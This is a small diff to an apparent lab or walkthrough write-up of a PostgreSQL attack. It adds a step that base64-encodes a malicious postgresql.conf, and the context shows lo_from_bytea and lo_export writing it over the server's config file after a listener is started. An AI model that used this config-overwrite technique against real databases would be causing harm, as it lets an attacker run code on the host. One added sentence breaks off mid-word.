@@ -297,6 +297,12 @@ Ill start a listener
 Now the next step is to overwrite the current config with my malicious one
 
 ```python
+cat postgesql.conf | base64 -w 0 | xclip -selection clipboard
+```
+
+Ill cat the malicious conf file then base64 encode its output and diabl
+
+```python
 SELECT lo_from_bytea(12345, decode('<base64>', 'base64'))  
 SELECT lo_export(12345, '/etc/postgresql/15/main/postgresql.conf')
 ```
